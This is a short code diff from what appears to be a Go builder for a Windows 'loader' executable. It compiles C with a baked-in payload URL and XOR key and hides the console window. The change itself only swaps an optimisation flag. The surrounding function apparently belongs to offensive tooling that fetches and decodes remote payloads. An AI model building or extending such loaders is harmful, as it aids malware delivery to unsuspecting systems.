@@ -1259,7 +1259,7 @@ func BuildCLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string
 	outPath := filepath.Join(outDir, resolveOutName(cfg, "loader_c_amd64.exe"))
 
 	args := []string{
-		"-O2", "-s", "-mwindows",
+		"-Os", "-s", "-mwindows",
 		"-Wall", "-Wno-unused-parameter",
 		fmt.Sprintf("-DPayloadURL=%q", payloadURL),
 		fmt.Sprintf("-DXORKey=%q", xorKeyHex),
